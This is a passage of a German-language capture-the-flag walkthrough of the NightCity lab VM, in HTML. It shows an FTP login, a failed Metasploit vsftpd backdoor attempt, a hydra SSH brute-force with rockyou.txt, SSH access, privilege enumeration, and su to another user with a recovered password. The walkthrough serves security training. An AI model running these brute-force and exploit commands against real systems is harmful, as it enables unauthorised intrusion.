+                     <div class="prompt ftp-prompt">ftp> <span class="command">open nightcity.vuln</span></div>
+                     <pre>Connected to nightcity.vuln.</pre>
+                     <div class="prompt ftp-prompt">Name (nightcity.vuln:root): <span class="command">batman</span></div>
+                     <pre>331 Please specify the password.</pre>
+                     <div class="prompt ftp-prompt">Password: <span class="command"><span class="password">ThisIsTheRealPassw0rd!</span></span></div>
+                     <pre>230 Login successful.</pre>
+                     <div class="prompt ftp-prompt">ftp> <span class="command">cd /home</span></div>
+                     <pre>250 Directory successfully changed.</pre>
+                     <div class="prompt ftp-prompt">ftp> <span class="command">ls</span></div>
+                     <pre>
+229 Entering Extended Passive Mode (|||46907|)
+150 Here comes the directory listing.
+drwxrwx---   15 1000     1000         4096 Jun 09  2022 administrator
+drwxr-xr-x    3 0        0            4096 Jun 09  2022 anonymous
+drwxr-xr-x    5 1002     1002         4096 Jun 15  2022 batman
+226 Directory send OK.
+                     </pre>
+                     <div class="prompt ftp-prompt">ftp> <span class="command">quit</span></div>
+                     <pre>221 Goodbye.</pre>
+                 </div>
+             </div>
+
+             <p class="analysis">
+                 <strong>Analyse:</strong> Eine Datei `flag.txt` wird gefunden und ausgelesen (Kontext unklar, wo diese Datei gefunden wurde - möglicherweise im FTP-Verzeichnis von `batman` oder im aktuellen Verzeichnis des Angreifers).
+             </p>
+             <p class="evaluation">
+                 <strong>Bewertung:</strong> Der Inhalt "Nice try! but, this is not the flag. You have to keep working >:)" ist eine typische Falle oder ein Scherz in CTFs. Es handelt sich nicht um eine echte Flag.
+             </p>
+             <p class="recommendation">
+                 <strong>Empfehlung (Pentester):</strong> Ignorieren Sie diese Datei und konzentrieren Sie sich auf den SSH-Zugang.
+             </p>
+            <div class="code-block">
+                <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">cat flag.txt</span></div>
+                     <pre>Nice try! but, this is not the flag. You have to keep working >:)</pre>
+                 </div>
+            </div>
+
+            <p class="analysis">
+                <strong>Analyse:</strong> Es wird versucht, einen bekannten Exploit für vsftpd (Version 2.3.4 Backdoor) mittels Metasploit auszuführen. `msfconsole` wird gestartet, nach `vsftpd`-Exploits gesucht, der `vsftpd_234_backdoor`-Exploit ausgewählt (`use 1`) und mit `run` gegen das Ziel ausgeführt.
+            </p>
+             <p class="evaluation">
+                 <strong>Bewertung:</strong> Der Exploit schlägt fehl ("Exploit completed, but no session was created."). Dies liegt daran, dass die auf dem Ziel laufende vsftpd-Version 3.0.3 ist (wie im Nmap-Scan `ftp-syst` gezeigt) und nicht die verwundbare Version 2.3.4.
+             </p>
+             <p class="recommendation">
+                 <strong>Empfehlung (Pentester):</strong> Geben Sie den vsftpd-Exploit-Versuch auf. Konzentrieren Sie sich auf den SSH-Zugang mit den gefundenen `batman`-Credentials.
+                 <br>
+                 <strong>Empfehlung (Admin):</strong> Gut, dass die vsftpd-Version nicht die mit dem Backdoor ist. Dennoch sollte sie aktuell gehalten werden.
+             </p>
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">msfconsole</span></div>
+                     <pre>
+                          ########                  #
+                      #################            #
+                   ######################         #
+                  #########################      #
+                ############################
+               ##############################
+               ###############################
+              ###############################
+              ##############################
+                              #    ########   #
+                 ##        ###        ####   ##
+                                      ###   ###
+                                    ####   ###
+               ####          ##########   ####
+               #######################   ####
+                 ####################   ####
+                  ##################  ####
+                    ############      ##
+                       ########        ###
+                      #########        #####
+                    ############      ######
+                   ########      #########
+                     #####       ########
+                       ###       #########
+                      ######    ############
+                     #######################
+                     #   #   ###  #   #   ##
+                     ########################
+                      ##     ##   ##     ##
+                            https://metasploit.com
+
+
+       =[ metasploit v6.3.19-dev                          ]
++ -- --=[ 2318 exploits - 1215 auxiliary - 412 post       ]
++ -- --=[ 1234 payloads - 46 encoders - 11 nops           ]
++ -- --=[ 9 evasion                                       ]
+
+Metasploit tip: View a module's description using
+info, or the enhanced version in your browser with
+info -d
+Metasploit Documentation: https://docs.metasploit.com/
+
+                     </pre>
+                     <div class="prompt metasploit-prompt">msf6 > <span class="command">search vsftpd</span></div>
+                     <pre>
+Matching Modules
+================
+
+   #  Name                                  Disclosure Date  Rank       Check  Description
+   -  ----                                  ---------------  ----       -----  -----------
+   0  auxiliary/dos/ftp/vsftpd_232          2011-02-03       normal     Yes    VSFTPD 2.3.2 Denial of Service
+   1  exploit/unix/ftp/vsftpd_234_backdoor  2011-07-03       excellent  No     VSFTPD v2.3.4 Backdoor Command Execution
+
+
+Interact with a module by name or index. For example info 1, use 1 or use exploit/unix/ftp/vsftpd_234_backdoor
+                     </pre>
+                      <div class="prompt metasploit-prompt">msf6 > <span class="command">use 1</span></div>
+                      <div class="prompt metasploit-prompt">msf6 exploit(unix/ftp/vsftpd_234_backdoor) > <span class="command">set RHOSTS 192.168.2.110</span></div>
+                      <pre>RHOSTS => 192.168.2.110</pre>
+                      <div class="prompt metasploit-prompt">msf6 exploit(unix/ftp/vsftpd_234_backdoor) > <span class="command">run</span></div>
+                     <pre>
+[*] Started reverse TCP handler on 192.168.2.137:4444
+[*] 192.168.2.110:21 - Banner: 220 Welcome to the NightCity Server!!
+[*] 192.168.2.110:21 - USER: 331 Please specify the password.
+[*] Exploit completed, but no session was created.
+                     </pre>
+                 </div>
+             </div>
+
+             <p class="analysis">
+                 <strong>Analyse:</strong> `hydra` wird erneut verwendet, diesmal um das Passwort `<span class="password">ThisIsTheRealPassw0rd!</span>` für den Benutzer `batman` auf dem SSH-Dienst (Port 22) zu bestätigen.
+             </p>
+             <p class="evaluation">
+                 <strong>Bewertung:</strong> Hydra ist erfolgreich und bestätigt, dass die Zugangsdaten auch für SSH gültig sind.
+             </p>
+             <p class="recommendation">
+                 <strong>Empfehlung (Pentester):</strong> Loggen Sie sich nun per SSH als `batman` ein.
+             </p>
+            <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">hydra -l batman -P /usr/share/wordlists/rockyou.txt ssh://nightcity.vuln:22 -t 64</span></div>
+                     <pre>
+Hydra v9.4 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2023-06-19 23:32:26
+[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
+[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
+[DATA] max 64 tasks per 1 server, overall 64 tasks, 14344410 login tries (l:1/p:14344410), ~224132 tries per task
+[DATA] attacking ssh://nightcity.vuln:22/
+[22][ssh] host: nightcity.vuln   login: batman   password: <span class="password">ThisIsTheRealPassw0rd!</span>
+1 of 1 target successfully completed, 1 valid password found
+[WARNING] Writing restore file because 24 final worker threads did not complete until end.
+[ERROR] 24 targets did not resolve or could not be connected
+[ERROR] 0 target did not complete
+Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2023-06-19 23:32:40
+                     </pre>
+                 </div>
+            </div>
+        </section>
+
+        <section id="initial-access">
+            <h2>Initial Access (batman)</h2>
+            <p class="analysis">
+                <strong>Analyse:</strong> Der Pentester meldet sich per SSH als Benutzer `batman` mit dem zuvor gefundenen Passwort am Zielsystem `nightcity.vuln` an.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Der Login ist erfolgreich. Der Willkommens-Banner zeigt Ubuntu 18.04.6 LTS und einen speziellen CTF-Hinweis. Der Angreifer hat nun eine Shell als `batman`.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Beginnen Sie mit der lokalen Enumeration als `batman`: `sudo -l`, SUID-Dateien, Home-Verzeichnis-Inhalt, laufende Prozesse, Netzwerkverbindungen usw.
+                <br>
+                <strong>Empfehlung (Admin):</strong> Das SSH-Passwort für `batman` ist kompromittiert und muss geändert werden. Untersuchen Sie die zugrundeliegenden Schwachstellen (Steganographie, FTP). Aktualisieren Sie das Betriebssystem und OpenSSH.
+            </p>
+            <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">ssh batman@nightcity.vuln</span></div>
+                     <pre>
+The authenticity of host 'nightcity.vuln (192.168.2.110)' can't be established.
+ED25519 key fingerprint is SHA256:b5bJxI3fDeAAZm5bTrbGo9f1KEpEBR0FiU/HV8nzM3M.
+This key is not known by any other names.
+Are you sure you want to continue connecting (yes/no/[fingerprint])? <span class="command">yes</span>
+Warning: Permanently added 'nightcity.vuln' (ED25519) to the list of known hosts.
+batman@nightcity.vuln's password: <span class="password">ThisIsTheRealPassw0rd!</span>
+
+ _   _ _       _     _    ____ _ _
+| \ | (_) __ _| |__ | |_ / ___(_) |_ _   _
+|  \| | |/ _` | '_ \| __| |   | | __| | | |
+| |\  | | (_| | | | | |_| |___| | |_| |_| |
+|_| \_|_|\__, |_| |_|\__|\____|_|\__|\__, |
+         |___/                       |___/
+
+***  NightCityCTF © 2022 by Waidroc & Cillo31 is licensed under CC BY-NC-SA 4.0.  ***
+              ***  https://www.github.com/Waidroc/NightCityCTF ***
+
+Welcome to Ubuntu 18.04.6 LTS (5.4.0-84-generic).
+
+System information as of: Mon Jun 19 23:33:21 CEST 2023
+
+System Load:	0.00	IP Address:
+Memory Usage:	8.7%	System Uptime:	49 min
+Usage On /:	66%	Swap Usage:	0.8%
+Local Users:	0	Processes:	131
+
+*** System restart required ***
+48 updates can be applied immediately.
+To see these additional updates run: apt list --upgradable
+
+Last login: Wed Jun 15 19:15:17 2022 from 10.0.2.8
+                     </pre>
+                      <div class="prompt no-kali-prompt">batman@NightCity:~$ </div>
+                 </div>
+             </div>
+        </section>
+
+        <section id="privesc-joker">
+            <h2>Privilege Escalation (batman -> joker)</h2>
+            <p class="analysis">
+                <strong>Analyse:</strong> Als `batman` wird `sudo -l` ausgeführt, um die `sudo`-Berechtigungen zu prüfen. Das Passwort (`ThisIsTheRealPassw0rd!`) wird eingegeben.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Die Ausgabe ("Lo sentimos, el usuario batman no puede ejecutar sudo en NightCity.") bedeutet "Sorry, user batman may not run sudo on NightCity.". Der Benutzer `batman` hat keine `sudo`-Rechte.
+            </p>
+             <p class="recommendation">
+                 <strong>Empfehlung (Pentester):</strong> Da `sudo` keine Option ist, fahren Sie mit anderen Enumerationstechniken fort: SUID-Dateien, Capabilities, Cronjobs, Kernel-Exploits, Suche nach Passwörtern/Schlüsseln in Dateien.
+             </p>
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt no-kali-prompt">batman@NightCity:~$ <span class="command">sudo -l</span></div>
+                     <pre>
+[sudo] contraseña para batman: <span class="password">ThisIsTheRealPassw0rd!</span>
+Lo sentimos, el usuario batman no puede ejecutar sudo en NightCity.
+                     </pre>
+                 </div>
+             </div>
+
+             <p class="analysis">
+                 <strong>Analyse:</strong> Es wird nach SUID-Binaries gesucht (`find / -type f -perm -4000 -ls 2>/dev/null`).
+             </p>
+             <p class="evaluation">
+                 <strong>Bewertung:</strong> Eine sehr lange Liste von SUID-Dateien wird gefunden, darunter viele Standard-Binaries (`ping`, `mount`, `su`, `sudo`, `passwd` etc.) und viele Dateien unter `/snap/`. Auch VBoxGuestAdditions-Binaries sind vorhanden. Es gibt keine offensichtlich ungewöhnlichen oder veralteten Binaries, die auf einen einfachen Exploit hindeuten.
+             </p>
+             <p class="recommendation">
+                 <strong>Empfehlung (Pentester):</strong> Die Liste ist zu umfangreich für eine schnelle manuelle Prüfung. Konzentrieren Sie sich auf andere Vektoren oder verwenden Sie Tools wie `linpeas.sh`, um die SUID-Liste nach bekannten Schwachstellen zu filtern.
+                 <br>
+                 <strong>Empfehlung (Admin):</strong> Überprüfen Sie die Notwendigkeit aller SUID-Binaries und entfernen Sie das Bit, wo immer möglich. Halten Sie das System und Snap-Pakete aktuell.
+             </p>
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt no-kali-prompt">batman@NightCity:~$ <span class="command">find / -type f -perm -4000 -ls 2>/dev/null</span></div>
+                     <pre>
+   405620   1440 -rwsr-xr-x   1 root     root      1473696 oct 18  2021 /opt/VBoxGuestAdditions-6.1.28/bin/VBoxDRMClient
+   786563     64 -rwsr-xr-x   1 root     root        64424 jun 28  2019 /bin/ping
+   786490     32 -rwsr-xr-x   1 root     root        30800 ago 11  2016 /bin/fusermount
+   786611     28 -rwsr-xr-x   1 root     root        26696 sep 16  2020 /bin/umount
+   786526     44 -rwsr-xr-x   1 root     root        43088 sep 16  2020 /bin/mount
+   786867     44 -rwsr-xr-x   1 root     root        44664 nov 29  2022 /bin/su
+      297    129 -rwsr-xr-x   1 root     root       131832 may 12 12:26 /snap/snapd/19361/usr/lib/snapd/snap-confine
+    # ... (sehr viele weitere Zeilen, hauptsächlich Standard und Snap) ...
+   787559     16 -rwsr-xr-x   1 root     root               14328 ene 12  2022 /usr/lib/policykit-1/polkit-agent-helper-1
+                     </pre>
+                 </div>
+             </div>
+
+             <p class="analysis">
+                 <strong>Analyse:</strong> Weitere Enumerationsbefehle werden ausgeführt: `id` (Benutzer-/Gruppeninfo), `getcap -r /` (Dateifähigkeiten), `ls -la /etc/passwd` (Berechtigungen der Passwortdatei), `ss -atlpn` (lauschende TCP-Ports). Anschließend wird die Ausgabe eines Enumerationsskripts gezeigt, das nach beschreibbaren Dateien sucht.
+             </p>
+             <p class="evaluation">
+                 <strong>Bewertung:</strong>
+                 *   `id`: Bestätigt `batman`.
+                 *   `getcap`: Zeigt nur Standard-Capabilities.
+                 *   `ls /etc/passwd`: Zeigt Standardberechtigungen (`-rw-r--r-- root root`). Kein direkter Angriffspunkt.
+                 *   `ss`: Bestätigt die bekannten Ports 21, 22, 80 und lokale Dienste (systemd-resolved, cups).
+                 *   Beschreibbare Dateien: Listet viele temporäre Verzeichnisse (`/dev/mqueue`, `/dev/shm`, `/tmp`, `/snap/.../tmp`). Interessant ist `/home/anonymous/reminder`, was mit dem beschreibbaren FTP-Verzeichnis übereinstimmt.
+                 Keiner dieser Befehle enthüllt einen klaren Eskalationspfad.
+             </p>
+             <p class="recommendation">
+                 <strong>Empfehlung (Pentester):</strong> Die Standard-Enumeration war bisher nicht erfolgreich. Gehen Sie zurück zu den Hinweisen: `reminder.txt` ("Local user is in the coordinates"), `robots.txt` ("Robin has the key"), die Bilder im `/secret`-Verzeichnis. Untersuchen Sie die Bilder `some-light.jpg` und `veryImportant.jpg` erneut, insbesondere auf visuelle Hinweise.
+             </p>
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt no-kali-prompt">batman@NightCity:/tmp$ <span class="command">id</span></div>
+                     <pre>uid=1002(batman) gid=1002(batman) groups=1002(batman)</pre>
+                     <div class="prompt no-kali-prompt">batman@NightCity:/tmp$ <span class="command">getcap -r / 2>/dev/null</span></div>
+                     <pre>
+/snap/core22/750/usr/bin/ping = cap_net_raw+ep
+/snap/core20/1891/usr/bin/ping = cap_net_raw+ep
+/snap/core20/1518/usr/bin/ping = cap_net_raw+ep
+/usr/bin/mtr-packet = cap_net_raw+ep
+/usr/bin/gnome-keyring-daemon = cap_ipc_lock+ep
+/snap/core18/2409/usr/bin/ping = cap_net_raw+ep
+/snap/core18/2785/usr/bin/ping = cap_net_raw+ep
+                     </pre>
+                     <div class="prompt no-kali-prompt">batman@NightCity:/var/backups$ <span class="command">ls -la /etc/passwd</span></div>
+                     <pre>-rw-r--r-- 1 root root 2727 jun  9  2022 /etc/passwd</pre>
+                     <div class="prompt no-kali-prompt">batman@NightCity:/var/backups$ <span class="command">ss -atlpn</span></div>
+                     <pre>
+State      Recv-Q      Send-Q            Local Address:Port            Peer Address:Port
+LISTEN     0           128               127.0.0.53%lo:53                   0.0.0.0:*
+LISTEN     0           32                      0.0.0.0:21                   0.0.0.0:*
+LISTEN     0           128                     0.0.0.0:22                   0.0.0.0:*
+LISTEN     0           5                     127.0.0.1:631                  0.0.0.0:*
+LISTEN     0           511                           *:80                         *:*
+LISTEN     0           128                        [::]:22                      [::]:*
+LISTEN     0           5                         [::1]:631                     [::]:*
+                     </pre>
+                 </div>
+             </div>
+              <div class="code-block">
+                  <div class="terminal">
+                     <!-- Implizierte Ausgabe eines Enumerationsskripts -->
+                     <pre>
+Interesting writable files owned by me or writable by everyone (not in Home) (max 500)
+https://book.hacktricks.xyz/linux-hardening/privilege-escalation#writable-files
+/dev/mqueue
+/dev/shm
+/home/anonymous/reminder
+/home/batman # (Eigenes Home-Verzeichnis, erwartet)
+/run/lock
+/run/user/1002
+/run/user/1002/gnupg
+/run/user/1002/systemd
+/snap/core18/2409/tmp
+/snap/core18/2409/var/tmp
+/snap/core18/2785/tmp
+# ... (viele weitere /snap/.../tmp Verzeichnisse) ...
+/snap/core22/750/tmp
+/snap/core22/750/var/tmp
+/tmp
+# /tmp/bUb0WQBp # (Temporäre Datei?)
+/tmp/.font-unix
+# ... (weitere /tmp/.XXX-unix)
+                     </pre>
+                  </div>
+              </div>
+
+              <p class="analysis">
+                  <strong>Analyse:</strong> Hier wird eine Information eingefügt, die offenbar durch externe Analyse (Betrachtung eines Bildes aus `/secret/` mit Bildbearbeitungssoftware) gewonnen wurde. Ein Passwort wurde durch Aufhellen eines dunklen Bereichs (Kaminrohr) in einem Bild sichtbar gemacht.
+              </p>
+              <p class="evaluation">
+                  <strong>Bewertung:</strong> Das gefundene Passwort ist `<span class="password">ThatMadeMeL4ugh!</span>`. Dies ist ein starker Kandidat für einen anderen Benutzer auf dem System, möglicherweise einen mit höheren Rechten oder einen thematisch passenden (wie `joker` zum `batman`-Thema).
+              </p>
+              <p class="recommendation">
+                  <strong>Empfehlung (Pentester):</strong> Versuchen Sie, sich mit diesem Passwort als andere bekannte oder vermutete Benutzer (`administrator`, `joker`, `robin`) mittels `su` anzumelden.
+                  <br>
+                  <strong>Empfehlung (Admin):</strong> Verstecken Sie keine Passwörter oder Hinweise in Bildern, auch nicht durch Verdunkeln. Informationen können oft durch einfache Bildbearbeitung wiederhergestellt werden.
+              </p>
+             <div class="code-block">
+                 <div class="terminal">
+                     <pre>
+# Hinweis aus externer Analyse (Bildbearbeitung):
+# Passwort gefunden durch Aufhellen eines Bildes (vermutlich aus /secret/):
+<span class="password">ThatMadeMeL4ugh!</span>
+                     </pre>
+                  </div>
+              </div>
+
+             <p class="analysis">
+                 <strong>Analyse:</strong> Der Pentester versucht, mit dem im Bild gefundenen Passwort (`ThatMadeMeL4ugh!`) zum Benutzer `joker` zu wechseln.
+             </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Der Wechsel ist erfolgreich! Nach Eingabe des Passworts erhält der Angreifer eine Shell als Benutzer `joker`. Dies ist der nächste Schritt der Eskalation.
+            </p>
+             <p class="recommendation">
+                 <strong>Empfehlung (Pentester):</strong> Untersuchen Sie die Umgebung als `joker`. Prüfen Sie das Home-Verzeichnis, `sudo -l`.
+             </p>
+            <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt no-kali-prompt">batman@NightCity:/home/anonymous/reminder$ <span class="command">su joker</span></div>
+                     <pre>Contraseña: <span class="password">ThatMadeMeL4ugh!</span></pre>
+                     <div class="prompt no-kali-prompt">joker@NightCity:/home/anonymous/reminder$ </div>
+                 </div>
+             </div>
+        </section>
+
+        <section id="poc"> <!-- POC Sektion beginnt hier -->
+             <h2>Proof of Concept (joker -> Flag Access)</h2>
+             <p class="analysis">
+                 <strong>Kurzbeschreibung:</strong> Dieser Proof of Concept beschreibt, wie der Zugang als Benutzer `joker` (erlangt durch ein in einem Bild verstecktes Passwort) genutzt wird, um auf die Root-Flag zuzugreifen, die sich in einem versteckten Home-Verzeichnis befindet.
+             </p>
+             <p class="evaluation">
+                 <strong>Voraussetzungen:</strong>
+                 *   Zugriff als Benutzer `joker`.
+                 *   Kenntnis des Speicherorts der Flag (oder Fähigkeit, diesen zu finden).
+             </p>
+
+             <p class="analysis">
+                 <strong>Schritt 1: Auffinden des Home-Verzeichnisses und der Flag</strong><br>
+                 1.  `ls -la /home/`: Listet die Home-Verzeichnisse auf und enthüllt ein verstecktes Verzeichnis `.joker`.
+                 2.  `cd /home/.joker`: Wechsel in das versteckte Home-Verzeichnis.
+                 3.  `ls -la`: Listet den Inhalt von `.joker` auf, einschließlich einer Datei namens `flag.txt`, die `root` gehört, aber für andere lesbar ist (`-rw-r--r--`).
+                 4.  `cat flag.txt`: Zeigt den Inhalt der Flag-Datei an.
+             </p>
+            <p class="evaluation">
+                <strong>Bewertung (Schritt 1):</strong> Der Benutzer `joker` hat Zugriff auf sein verstecktes Home-Verzeichnis `.joker`. In diesem Verzeichnis befindet sich die Datei `flag.txt`, die die Root-Flag enthält (in Form von ASCII-Art). Obwohl die Datei `root` gehört, erlauben die Berechtigungen (`-rw-r--r--`) jedem Benutzer (einschließlich `joker`), sie zu lesen. Der Zugriff auf `joker` war somit der letzte Schritt, um die Root-Flag lesen zu können.
+            </p>
+             <p class="recommendation">
+                 <strong>Empfehlung (Pentester):</strong> Root-Flag (ASCII-Art) erfolgreich gefunden und angezeigt. Der Test ist abgeschlossen.
+                 <br>
+                 <strong>Empfehlung (Admin):</strong> Die Root-Flag sollte nicht für normale Benutzer lesbar sein und sich nicht in einem Benutzerverzeichnis befinden (typischerweise `/root/root.txt`). Die Berechtigungen (`-rw-r--r--`) auf `flag.txt` sind unsicher. Versteckte Verzeichnisse (`.joker`) bieten keine echte Sicherheit. Die Notwendigkeit, ein Passwort aus einem Bild zu extrahieren, um zu `joker` zu gelangen, war der entscheidende Schutzmechanismus hier.
+             </p>
+             <p class="evaluation">
+                 <strong>Risikobewertung:</strong> Die Kombination aus anonymem FTP, Steganographie, einem leicht zu erratenden Passwort für `batman` (gefunden über Stego), einem in einem Bild versteckten Passwort für `joker` und einer falsch platzierten/berechtigten Root-Flag ermöglichte die Kompromittierung der Flags. Da kein echter Root-Shell-Zugriff erlangt wurde, aber die Root-Flag gelesen werden konnte, ist das Risiko hoch, aber nicht kritisch im Sinne einer vollständigen Systemübernahme.
+             </p>
+            <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt no-kali-prompt">joker@NightCity:/home/anonymous/reminder$ <span class="command">ls -la /home/</span></div>
+                     <pre>
+total 24
+drwxr-xr-x  6 root          root          4096 jun  9  2022 .
+drwxr-xr-x 24 root          root          4096 jun 19 23:26 ..
+drwxrwx--- 15 administrator administrator 4096 jun  9  2022 administrator
+drwxr-xr-x  3 root          root          4096 jun  9  2022 anonymous
+drwxr-xr-x  5 batman        batman        4096 jun 15  2022 batman
+drwxrwx---  2 joker         joker         4096 jun 13  2022 .joker
+                     </pre>
+                     <div class="prompt no-kali-prompt">joker@NightCity:/home/anonymous/reminder$ <span class="command">cd /home/.joker</span></div>
+                     <div class="prompt no-kali-prompt">joker@NightCity:/home/.joker$ <span class="command">ls -la</span></div>
+                     <pre>
+total 28
+drwxrwx--- 2 joker joker 4096 jun 13  2022 .
+drwxr-xr-x 6 root  root  4096 jun  9  2022 ..
+-rwxrwx--- 1 joker joker  220 jun  8  2022 .bash_logout
+-rwxrwx--- 1 joker joker 3771 jun  8  2022 .bashrc
+-rw-r--r-- 1 root  root  7157 jun  9  2022 flag.txt
+-rwxrwx--- 1 joker joker  807 jun  8  2022 .profile
+                     </pre>
+                     <div class="prompt no-kali-prompt">joker@NightCity:/home/.joker$ <span class="command">cat flag.txt</span></div>
+                     <pre style="font-size: 7px; line-height: 7px;">
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣴⣤⣶⡶⠛⠉⠉⠀⣀⣀⣀⣤⣤⣤⣶⣶⣒⣛⣉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣴⣿⣿⣿⡿⠋⢀⣠⣴⣶⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣶⢤⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⢀⡴⣿⣿⣿⣿⣿⣿⣷⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⣟⡽⣟⣫⣭⣶⣶⣿⣿⣦⣄⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⢠⠏⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⠋⠙⠉⠁⠀⢿⣿⣿⣿⣿⡿⠿⠿⣿⡿⣶⣦⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⡄⠀
+⠀⠀⠀⠀⠀⠀⣴⠃⠀⠀⠈⠻⠿⠿⠿⠿⠟⠛⠉⠁⠙⠿⠿⠛⠋⠉⠀⠀⠀⢀⣠⣴⣶⣾⣿⣿⣿⣿⣷⣶⣦⣙⠻⢿⣿⣿⣿⣶⣶⣶⣦⣤⣤⣴⢶⣾⠟⠀⠀
+⠀⠀⠀⠀⠀⠰⡏⣴⣄⠀⠀⠀⠀⠀⢀⣠⣴⣤⣄⣀⠀⠀⠀⠀⠀⠀⢀⣴⣶⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣦⡉⠙⠛⠛⠛⠛⠛⠉⣉⡴⢟⣡⣴⠏⠀
+⠀⠀⠀⠀⠀⠀⠳⣿⣿⣷⣦⣀⠀⢠⣿⣿⣿⣿⣿⣿⣿⣶⡄⠀⣀⣶⣿⣿⡿⠿⠟⠛⠛⠛⠛⠛⠛⠛⠿⣿⣿⣿⣿⣿⣿⣶⠀⠀⠀⠀⣰⣾⣷⣾⣿⡿⠃⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠈⠛⠿⣿⣿⣷⣿⣿⣿⣿⣿⣿⣿⣿⣿⣣⢞⣭⠿⠋⠁⠀⠀⠀⠀⠀⠀⠠⣤⣤⣶⣾⣿⣿⣿⣯⣭⣿⣿⣶⣶⣿⣿⣿⣿⣿⣿⡟⠁⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠉⠛⢿⡿⣿⣿⣿⣿⣿⣿⣿⡵⠋⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠏⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣼⠀⠀⠉⠉⠛⠿⠿⠏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠙⣻⣿⣿⣿⣿⣿⣿⣿⣿⠿⠿⢿⣿⣿⠟⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⠇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡶⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠿⣿⣿⣿⣿⣿⠟⠁⠀⣠⣶⣿⠇⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣼⠀⠀⠀⠀⠀⠈⠳⣄⠀⠀⠀⣾⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣤⠀⠈⠻⣿⣿⡏⠀⣰⠊⠱⠛⡆⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡟⠀⠀⠀⠀⠀⠀⠀⠈⠳⣄⠈⠁⠀⠀⠀⠀⣀⣀⣠⠤⠶⠶⠿⣫⠟⠁⠀⠀⠀⠈⠻⣁⣼⠗⣿⠀⢠⡇⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡇⠀⠀⠀⠀⠀⣀⣀⣀⣀⣈⣷⠦⠤⠶⠖⠿⣭⣁⣀⣀⣠⣶⡾⠋⠀⠀⠀⠀⠀⠀⠀⠋⠁⢠⡇⠀⣼⠁⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠸⠿⠶⣶⣾⣯⣍⣉⠉⠙⠛⣿⠁⠀⠀⠀⠀⠀⠀⠉⠛⠿⠿⠛⠀⠀⠀⠀⣤⣀⣀⠀⠀⢸⡄⠀⣠⡜⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢈⡏⠉⠻⢷⣶⣿⡏⠀⠀⠀⠀⠀⠀⠀⠀⢀⣠⠤⠤⠤⢤⣄⣀ ⠀⠀⠀⠀⠀⢿⠉⠁⠙⢦⡀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡾⠀⠀⢀⣀⣈⣼⠀⠀⠀⠀⠀⣀⣀⡴⠂⠉⠀⠀⠀⣠⢾⠁⠀⣽⠲⡄⠀⠀⠀⢸⡆⠀⠀⠀⠉⠳⢄⡀⠀⠀⠀⠀⠀
